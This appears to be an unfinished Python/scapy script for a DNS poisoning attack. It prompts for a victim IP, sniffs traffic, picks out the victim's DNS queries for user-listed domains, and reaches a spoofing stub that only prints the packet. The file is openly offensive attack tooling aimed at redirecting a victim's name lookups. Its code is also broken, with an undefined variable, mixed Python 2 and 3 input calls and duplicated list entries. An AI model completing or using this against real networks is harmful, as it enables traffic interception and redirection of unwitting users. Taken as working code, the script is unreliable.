from scapy.all import *

# victimNotInvolved = False
# dnsQueryFromVictim = True


def getDnsMsg(ipVictim,urlsToSpoof):

    while(True):
        pkt = sniff(count=1)

        if DNS in pkt:
            dnsQueryFromVictim, goodUrl = getDnsMsgType(pkt,ipVictim,urlsToSpoof)
            return (pkt, dnsQueryFromVictim, goodUrl)
    
def getDnsMsgType(pkt,ipVictim,urlsToSpoof):
    
    if pkt[IP].src == ipVictim: 
        if urlsToSpoof:
            goodUrl = bool(pkt[IP][DNS].qd.qname in urlsToSpoof)
        else: 
            goodUrl = True
        return (True, goodUrl)
    
    else: 
        return (False, False)

def dnsSpoofVictimQuery(pkt,goodUrl):

    pkt.show()

    return

def dnsPoisoning():

    print("\nDNS poisoning attack\n")

    ipVictim = input("Victim IP address")

    (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(ipVictim,urlsToSpoof)
    
    if dnsQueryFromVictim:
        dnsSpoofVictimQuery(pkt,goodUrl)
    else:
        pass

    return

def showUrlsToSpoof(urlsToSpoof):
    print("URLs to spoof:")
    
    for url in urlsToSpoof:
        print(url)

    print("")

def inputUrlsToSpoof(urlsToSpoof):

    print("\ninput URLs to spoof")
    print("after entering last URL, enter c to continue\n")    

    def addUrls(urlsToSpoof):
	
        urlsToSpoof.append(user_in)
        urlsToSpoof.append("*." + user_in)
        urlsToSpoof.append("*." + user_in)

        return urlsToSpoof
    
    while(True):
        user_in = raw_input(">>> ")
        user_in_split = user_in.split(".")
    
        if user_in == "c":
            return urlsToSpoof
    
        elif len(user_in_split) == 2:
            urlsToSpoof = addUrls(urlsToSpoof)

        elif len(user_in_split) == 3:

            if user_in_split[0] == "www":
                del user_in_split[0]
                user_in = ".".join(user_in_split)
                urlsToSpoof = addUrls(urlsToSpoof)
	
            else:
                urlsToSpoof.append(user_in)
    
        else:
	        print("Error: bad input \"" + str(user_in) + "\"")
